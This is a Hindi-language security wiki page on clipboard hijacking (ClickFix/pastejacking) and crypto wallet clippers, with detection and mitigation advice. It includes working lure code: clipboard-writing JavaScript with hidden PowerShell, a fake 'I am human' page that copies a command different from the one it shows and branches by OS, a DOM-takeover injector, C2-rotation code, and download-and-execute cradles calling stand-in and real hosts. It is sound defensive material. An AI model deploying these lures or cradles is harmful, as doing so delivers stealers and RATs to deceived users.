# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "ऐसी कोई चीज़ कभी paste न करें जिसे आपने खुद copy न किया हो।" – पुरानी, लेकिन अब भी सही सलाह

## अवलोकन

Clipboard hijacking – जिसे *pastejacking* भी कहा जाता है – इस बात का फायदा उठाता है कि उपयोगकर्ता अक्सर commands को जाँचे बिना copy-and-paste करते हैं। कोई malicious web page (या JavaScript-capable context, जैसे Electron या Desktop application) प्रोग्राम के ज़रिए attacker द्वारा नियंत्रित text को system clipboard में डाल देता है। पीड़ितों को आम तौर पर सावधानी से तैयार किए गए social-engineering निर्देशों के ज़रिए **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) दबाने या terminal खोलकर clipboard content *paste* करने के लिए कहा जाता है, जिससे arbitrary commands तुरंत execute हो जाते हैं।

**कोई file download नहीं होती और कोई attachment नहीं खोला जाता**, इसलिए यह technique उन अधिकांश e-mail और web-content security controls को bypass कर देती है जो attachments, macros या direct command execution को monitor करते हैं। इसीलिए phishing campaigns में NetSupport RAT, Latrodectus loader या Lumma Stealer जैसे commodity malware families पहुँचाने के लिए यह attack लोकप्रिय है।<sup>[[1]](#references)</sup>

## Wallet-address replacement clippers

**Clipboard hijacking** का एक अन्य variant commands paste नहीं करता: यह तब तक इंतज़ार करता है जब तक पीड़ित कोई **cryptocurrency wallet address** copy न करे, फिर paste करने से ठीक पहले उसे चुपचाप attacker द्वारा नियंत्रित address से बदल देता है। यह लंबे wallet formats के विरुद्ध विशेष रूप से प्रभावी है, क्योंकि उपयोगकर्ता अक्सर केवल शुरुआती/आखिरी characters ही जाँचते हैं।<sup>[[8]](#references)</sup>

वास्तविक दुनिया में दिखने वाली आम विशेषताएँ:
- **Thin loader + nested payload**: दिखाई देने वाला app/exe किसी वैध trading या "profit" tool जैसा लगता है, जबकि असली clipper bundle में और भीतर छिपा होता है (उदाहरण के लिए, एक .NET loader किसी nested Rust payload को launch करता है)।
- **Regex-driven replacement**: malware `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` जैसी strings या यहाँ तक कि सामान्य **44-character Solana-like** strings को match करता है और उन्हें attacker wallets से बदल देता है।
- **बड़े पैमाने पर wallet rotation**: आधुनिक Windows samples में चोरी के बाद हर बार wallet reputation को नुकसान से बचाने के लिए, किसी currency के लिए एक static address के बजाय **हज़ारों** replacement wallets embedded हो सकते हैं।<sup>[[8]](#references)</sup>

### Windows clipper flow

एक सामान्य implementation में **`AddClipboardFormatListener`** के साथ registered hidden window होता है। हर clipboard update पर malware आम तौर पर ये calls करता है:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → मौजूदा clipboard data तक पहुँचें।
- **`GetClipboardData`** → text पढ़ें।
- **`EmptyClipboard`** + **`SetClipboardData`** → wallet string को attacker value से बदलें।

Clippers में अक्सर दिखने वाले न्यूनतम hunting regexes:

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

User-level persistence प्रभाव के लिए पर्याप्त है। देखा गया एक तरीका यह है:<sup>[[8]](#references)</sup>
- Payload को **`%APPDATA%\silke\silke.exe`** में कॉपी करें
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` के अंदर **Startup-folder LNK** बनाएँ

Detection के सुझाव:
- ऐसे processes जो clipboard APIs को लगातार call करते हैं और साथ ही `%APPDATA%` तथा user **Startup** folder में लिखते हैं।
- नए LNK/executable का बनना, जिसके बाद wallet-address clipboard rewrites होते हैं।
- ऐसे archives या fake-software bundles जिनमें कई अनुपयोगी files हों और एक छोटा launcher हो, जो nested binary शुरू करता हो।

### macOS social-engineered quarantine removal + LaunchAgent persistence

macOS पर, कुछ campaigns **`unlocker.command`** helper देते हैं और victim को निर्देश देते हैं कि अगर Gatekeeper कहे कि app damaged है या किसी unidentified developer की है, तो उस पर right-click करके → **Open** चुनें। Script बस quarantine हटाती है और पास की `.app` launch करती है:<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

यह **Gatekeeper exploit** नहीं है; यह एक **social-engineered quarantine bypass** है, जो इस तथ्य का फायदा उठाता है कि Gatekeeper के फ़ैसले `com.apple.quarantine` xattr पर निर्भर करते हैं।<sup>[[8]](#references)</sup>

चलने के बाद, clipper मौजूदा user के रूप में persist कर सकता है। इसके लिए यह लिखता है:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – `RunAtLoad` और `KeepAlive` वाला LaunchAgent

रक्षा के लिए एक उपयोगी बात यह है कि कुछ samples में **self-healing watchdog** होता है, जो लगभग हर 30 सेकंड में LaunchAgent और wrapper को फिर से लिखता है। अगर आप चल रही process को बंद किए बिना पहले plist हटाते हैं, तो malware इसे तुरंत फिर से बना सकता है।<sup>[[8]](#references)</sup> सुरक्षित cleanup का क्रम:
1. सक्रिय clipper process को बंद करें।
2. LaunchAgent plist को unload/delete करें।
3. `~/launch.sh` और कॉपी किए गए payload को delete करें।

### डिलीवरी नोट: नकली प्रतिष्ठा का प्रभाव बढ़ाना

इस परिवार के malware का तकनीकी रूप से सरल रहना संभव है, जबकि **distribution layer** सारा भारी काम करती है: नकली GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views और भरोसेमंद दिखने वाले VirusTotal comments/votes का इस्तेमाल binary को चलाए जाने से पहले विश्वसनीय दिखाने के लिए किया जाता है।<sup>[[8]](#references)</sup>

## ज़बरन इस्तेमाल करवाए गए Copy बटन और छिपे payloads (macOS one-liners)

कुछ macOS infostealers installer sites (जैसे Homebrew) की नकल करते हैं और **“Copy” बटन का इस्तेमाल ज़रूरी बनाते हैं**, ताकि users केवल दिख रहे text को select न कर सकें। Clipboard entry में अपेक्षित installer command के साथ जोड़ा गया Base64 payload होता है (जैसे `...; echo <b64> | base64 -d | sh`), इसलिए एक बार paste करने पर दोनों execute होते हैं, जबकि UI अतिरिक्त stage को छिपा देता है।<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

पुराने campaigns में `document.execCommand('copy')` का इस्तेमाल होता था, जबकि नए campaigns asynchronous **Clipboard API** (`navigator.clipboard.writeText`) पर निर्भर करते हैं।<sup>[[2]](#references)</sup>

## ClickFix / ClearFake का प्रवाह

1. उपयोगकर्ता typosquatted या compromised साइट (जैसे `docusign.sa[.]com`) पर जाता है।
2. Inject किया गया **ClearFake** JavaScript एक `unsecuredCopyToClipboard()` helper को call करता है, जो चुपचाप clipboard में Base64-encoded PowerShell one-liner सेव कर देता है।
3. HTML निर्देश पीड़ित से कहते हैं: *“**Win + R** दबाएँ, command paste करें और समस्या हल करने के लिए Enter दबाएँ।”*
4. `powershell.exe` चलता है और एक archive डाउनलोड करता है, जिसमें एक legitimate executable और एक malicious DLL होती है (क्लासिक DLL sideloading)।
5. Loader अतिरिक्त stages को decrypt करता है, shellcode inject करता है और persistence स्थापित करता है (जैसे scheduled task) — अंततः NetSupport RAT / Latrodectus / Lumma Stealer चलाता है।<sup>[[1]](#references)</sup>

### NetSupport RAT Chain का उदाहरण

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe` (वैध Java WebStart) अपनी डायरेक्टरी में `msvcp140.dll` खोजता है।
* दुर्भावनापूर्ण DLL **GetProcAddress** के ज़रिए APIs को डायनामिक रूप से resolve करता है, **curl.exe** से दो बाइनरी (`data_3.bin`, `data_4.bin`) डाउनलोड करता है, उन्हें rolling XOR key `"https://google.com/"` से decrypt करता है, अंतिम shellcode inject करता है और **client32.exe** (NetSupport RAT) को `C:\ProgramData\SecurityCheck_v1\` में unzip करता है।<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. **curl.exe** से `la.txt` डाउनलोड करता है
2. **cscript.exe** के अंदर JScript downloader निष्पादित करता है
3. MSI payload प्राप्त करता है → signed application के साथ `libcef.dll` छोड़ता है → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### MSHTA के ज़रिए Lumma Stealer

```
mshta https://iplogger.co/xxxx =+\\xxx
```

**mshta** कॉल एक छिपी हुई PowerShell script लॉन्च करता है, जो `PartyContinued.exe` प्राप्त करती है, `Boat.pst` (CAB) को extract करती है, `extrac32` और फ़ाइलों को जोड़कर `AutoIt3.exe` को फिर से बनाती है, और अंत में एक `.a3x` script चलाती है, जो browser credentials को `sumeriavgv.digital` पर exfiltrate करती है।<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK, रोज़ बदलते C2 के साथ (PureHVNC)

कुछ ClickFix campaigns पूरी तरह file downloads छोड़ देते हैं और victims को एक one-liner paste करने का निर्देश देते हैं, जो WSH के ज़रिए JavaScript प्राप्त करके execute करती है, उसे persist करती है और रोज़ C2 बदलती है। देखा गया chain का उदाहरण:<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

मुख्य विशेषताएँ
- छिपाए गए URL को सतही निरीक्षण से बचने के लिए रनटाइम पर उलटा जाता है।
- JavaScript Startup LNK (WScript/CScript) के ज़रिए खुद को persist करता है और मौजूदा दिन के आधार पर C2 चुनता है — जिससे domain को तेज़ी से rotate किया जा सकता है।<sup>[[3]](#references)</sup>

तारीख के आधार पर C2s को rotate करने के लिए इस्तेमाल किया गया न्यूनतम JS fragment:<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

अगला चरण आमतौर पर एक loader deploy करता है, जो persistence स्थापित करता है और RAT (जैसे, PureHVNC) डाउनलोड करता है। यह अक्सर किसी hardcoded certificate पर TLS pinning करता है और traffic को chunks में भेजता है।<sup>[[3]](#references)</sup>

इस variant के लिए खास Detection ideas
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (या `cscript.exe`)।
- Startup artifacts: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` में LNK, जो `%TEMP%`/`%APPDATA%` के अंतर्गत JS path के साथ WScript/CScript चलाता हो।
- Registry/RunMRU और command-line telemetry में `.split('').reverse().join('')` या `eval(a.responseText)` मौजूद हों।
- लंबे command lines के बिना लंबे scripts भेजने के लिए बड़े stdin payloads के साथ बार-बार `powershell -NoProfile -NonInteractive -Command -` चलना।
- Scheduled Tasks, जो बाद में updater-जैसे task/path (जैसे, `\GoogleSystem\GoogleUpdater`) के तहत LOLBins, जैसे `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`, चलाते हों।

Threat hunting
- रोज़ बदलने वाले C2 hostnames और `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern वाले URLs।
- Clipboard write events के बाद Win+R में paste और फिर तुरंत `powershell.exe` चलने का correlation करें।

Blue-teams clipboard, process-creation और registry telemetry को मिलाकर pastejacking के दुरुपयोग का पता लगा सकते हैं:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` में **Win + R** commands का इतिहास रहता है — असामान्य Base64 / obfuscated entries खोजें।
* Security Event ID **4688** (Process Creation), जहाँ `ParentImage` == `explorer.exe` और `NewProcessName` इनमें से हो: { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }।
* संदिग्ध 4688 event से ठीक पहले `%LocalAppData%\Microsoft\Windows\WinX\` या temporary folders में file creations के लिए Event ID **4663** देखें।
* EDR clipboard sensors (अगर उपलब्ध हों) — `Clipboard Write` के तुरंत बाद शुरू हुए नए PowerShell process से correlation करें।

## IUAM-जैसे verification pages (ClickFix Generator): clipboard से console में copy करना + OS-aware payloads

हालिया campaigns नकली CDN/browser verification pages ("Just a moment…", IUAM-जैसे) बड़े पैमाने पर बनाते हैं, जो users को clipboard से OS-specific commands को native consoles में copy करने के लिए उकसाते हैं। इससे execution browser sandbox से बाहर चला जाता है और यह Windows तथा macOS दोनों पर काम करता है।<sup>[[4]](#references)</sup>

Builder द्वारा generated pages की मुख्य विशेषताएँ
- Payloads को उसी के अनुसार तैयार करने के लिए `navigator.userAgent` से OS detection (Windows PowerShell/CMD बनाम macOS Terminal)। Illusion बनाए रखने के लिए unsupported OS पर वैकल्पिक decoys/no-ops।
- सामान्य UI actions (checkbox/Copy) पर automatic clipboard-copy, जबकि दिखाई देने वाला text clipboard content से अलग हो सकता है।
- Mobile blocking और step-by-step instructions वाला popover: Windows → Win+R→paste→Enter; macOS → Terminal खोलें→paste→Enter।
- Compromised site के DOM को Tailwind-styled verification UI से overwrite करने के लिए optional obfuscation और single-file injector (नए domain registration की ज़रूरत नहीं)।<sup>[[4]](#references)</sup>

उदाहरण: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

macOS पर शुरुआती रन की persistence
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` का इस्तेमाल करें, ताकि terminal बंद होने के बाद भी execution जारी रहे और दिखाई देने वाले artifacts कम हों।<sup>[[4]](#references)</sup>

Compromised sites पर पेज का वहीं takeover
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

IUAM-style lures के लिए खास detection और hunting ideas
- Web: ऐसे pages जो Clipboard API को verification widgets से bind करते हैं; दिखाए गए text और clipboard payload में mismatch; `navigator.userAgent` के आधार पर branching; संदिग्ध contexts में Tailwind + single-page replace।
- Windows endpoint: browser interaction के तुरंत बाद `explorer.exe` → `powershell.exe`/`cmd.exe`; `%TEMP%` से batch/MSI installers का execution।
- macOS endpoint: browser events के आसपास Terminal/iTerm से `bash`/`curl`/`base64 -d` को `nohup` के साथ spawn करना; terminal बंद होने के बाद भी background jobs का चलते रहना।
- `RunMRU` Win+R history और clipboard writes को इसके बाद console process creation से correlate करें।

सहायक techniques के लिए यह भी देखें

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 के fake CAPTCHA / ClickFix बदलाव (ClearFake, Scarlet Goldfinch)

- ClearFake अब भी WordPress sites को compromise करता है और loader JavaScript inject करता है, जो external hosts (Cloudflare Workers, GitHub/jsDelivr) और यहां तक कि blockchain “etherhiding” calls (उदाहरण के लिए, `bsc-testnet.drpc[.]org` जैसे Binance Smart Chain API endpoints पर POSTs) की chains बनाकर मौजूदा lure logic प्राप्त करता है। हाल के overlays में fake CAPTCHAs का बड़े पैमाने पर इस्तेमाल होता है, जो users को कुछ download करने के बजाय एक one-liner copy/paste करने का निर्देश देते हैं (T1204.004)।<sup>[[6]](#references)</sup>
- Initial execution का काम अब तेजी से signed script hosts/LOLBAS को सौंपा जा रहा है। जनवरी 2026 की chains में पहले इस्तेमाल होने वाले `mshta` की जगह built-in `SyncAppvPublishingServer.vbs` का उपयोग किया गया, जिसे `WScript.exe` के जरिए execute किया गया और remote content fetch करने के लिए PowerShell-जैसे arguments, aliases और wildcards दिए गए:<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - `SyncAppvPublishingServer.vbs` signed है और आम तौर पर App-V द्वारा उपयोग की जाती है; `WScript.exe` और असामान्य arguments (`gal`/`gcm` aliases, wildcard वाले cmdlets, jsDelivr URLs) के साथ यह ClearFake के लिए high-signal LOLBAS stage बन जाती है।<sup>[[6]](#references)</sup>
- फरवरी 2026 के fake CAPTCHA payloads फिर से pure PowerShell download cradles पर आ गए। दो live examples:<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - पहली chain एक in-memory `iex(irm ...)` grabber है; दूसरी `WinHttp.WinHttpRequest.5.1` के ज़रिए payload को stage करती है, एक अस्थायी `.ps1` लिखती है, फिर hidden window में `-ep bypass` के साथ उसे launch करती है।<sup>[[6]](#references)</sup>

इन variants का पता लगाने और hunting के सुझाव
- Process lineage: browser → `explorer.exe` → clipboard writes/Win+R के तुरंत बाद `wscript.exe ...SyncAppvPublishingServer.vbs` या PowerShell cradles।
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, या raw IP `iex(irm ...)` patterns।
- Network: web browsing के तुरंत बाद script hosts/PowerShell से CDN worker hosts या blockchain RPC endpoints पर outbound traffic।
- File/registry: `%TEMP%` में अस्थायी `.ps1` बनना और इन one-liners वाली RunMRU entries; signed-script LOLBAS (WScript/cscript/mshta) द्वारा external URLs या obfuscated alias strings के साथ execution को block/alert करें।

## जून 2026 का ClickFix tradecraft: paste telemetry, verification के नकली comments और LOLBin chaining

Red Canary की हालिया telemetry से पता चलता है कि स्थिर indicator **कोई एक खास command नहीं**, बल्कि **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval** और **तुरंत execution** का संयोजन है।<sup>[[7]](#references)</sup>

### उल्लेखनीय operator patterns

- **Paste confirmation telemetry**: कुछ payloads असली stage से पहले `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` call करते हैं। इससे window को छोटा और शांत रखते हुए user interaction की पुष्टि होती है।
- **Verification के नकली comments**: PowerShell one-liners में `# Security check ✔️ I'm not a robot Verification ID: 138105` जैसी strings जोड़ी जा सकती हैं, ताकि command को Run / `cmd.exe` / PowerShell history में paste करने के बाद भी वह CAPTCHA-संबंधित लगे।
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` command line में static URL से बचता है, लेकिन फिर भी in-memory download-and-execute करता है।
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` flags में असामान्य casing और Unicode-जैसे characters का दुरुपयोग करता है, ताकि brittle detections को चकमा देते हुए भी `msiexec.exe` जैसा दिखे।
- **Caret-escaped LOLBin chains**: `cmd.exe` `^` escapes (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`) से keywords छिपा सकता है, nested shell को minimized करके शुरू कर सकता है, attacker content को `.pdf` जैसे benign extension से save कर सकता है, और फिर उसे `mshta` के ज़रिए execute कर सकता है।<sup>[[7]](#references)</sup>

## Mitigations

1. Browser hardening – clipboard write-access (`dom.events.asyncClipboard.clipboardItem` आदि) को disable करें या user gesture आवश्यक करें।
2. Security awareness – users को सिखाएँ कि वे sensitive commands को *type* करें या पहले text editor में paste करें।
3. PowerShell Constrained Language Mode / Execution Policy + Application Control से arbitrary one-liners को block करें।
4. Network controls – ज्ञात pastejacking और malware C2 domains पर outbound requests block करें।

## संबंधित Tricks

* **Discord Invite Hijacking** अक्सर users को malicious server में लुभाने के बाद उसी ClickFix approach का दुरुपयोग करता है:
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [क्लिक को रोकें: ClickFix Attack Vector से बचाव](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Pure Curtain के पीछे: RAT से Builder और फिर Coder तक](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [ClickFix Factory: IUAM ClickFix Generator का पहला खुलासा](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, Infostealer का वर्ष](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: फरवरी 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: जून 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Stars से Upvotes तक: Crypto Clipboard Hijacker को बढ़ावा देती नकली प्रतिष्ठा](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
